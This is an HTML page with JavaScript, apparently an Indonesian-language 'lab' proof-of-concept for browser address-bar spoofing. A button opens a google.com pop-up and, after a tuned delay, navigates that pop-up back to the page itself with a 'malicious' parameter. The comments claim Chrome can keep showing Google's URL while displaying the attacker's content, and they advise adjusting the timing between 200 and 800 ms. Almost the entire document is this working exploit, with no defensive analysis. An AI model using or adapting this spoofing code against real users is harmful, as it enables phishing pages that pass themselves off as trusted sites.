<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab: History Manipulation - FARISSAL B</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .box { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 1px solid #333; width: 85%; }
        button { background: #ff4b2b; color: white; border: none; padding: 18px; border-radius: 50px; font-weight: bold; width: 100%; cursor: pointer; }
        .desc { font-size: 12px; color: #9aa0a6; margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="box">
    <h2>Research: History Spoof</h2>
    <p class="desc">Teknik: Race Condition Navigasi</p>
    
    <button id="exploitBtn">TEST SPOOFING</button>
    
    <p id="status" style="margin-top:20px; font-family:monospace; color:#0f0; font-size:11px;"></p>
</div>

<script>
    const btn = document.getElementById('exploitBtn');
    const status = document.getElementById('status');

    btn.addEventListener('click', () => {
        status.innerText = "Membuka jendela...";

        // 1. Buka jendela baru (target spoofing: google.com)
        const spoofWin = window.open("https://www.google.com", "SpoofWindow", "width=500,height=600");

        if (spoofWin) {
            status.innerText = "Jendela terbuka. Menunggu race condition...";

            // 2. Trik utamanya: Tunggu sebentar pas lagi loading (timing sangat krusial!)
            setTimeout(() => {
                // 3. Paksa jendela tersebut pindah ke halaman kita kembali
                // Tapi karena proses navigasi google.com masih jalan, 
                // Chrome kadang "nyangkut" nampilin URL Google padahal isinya web kita.
                spoofWin.location.href = window.location.href + "?content=malicious";
                
                status.innerText = "Exploit dikirim. Cek bar alamat di jendela baru!";
            }, 500); // 500ms adalah angka rata-rata, bisa lo ganti-ganti (200-800ms)

        } else {
            alert("Pop-up diblokir! Izinkan pop-up dulu di pojok kanan atas browser.");
        }
    });
</script>

</body>
</html>
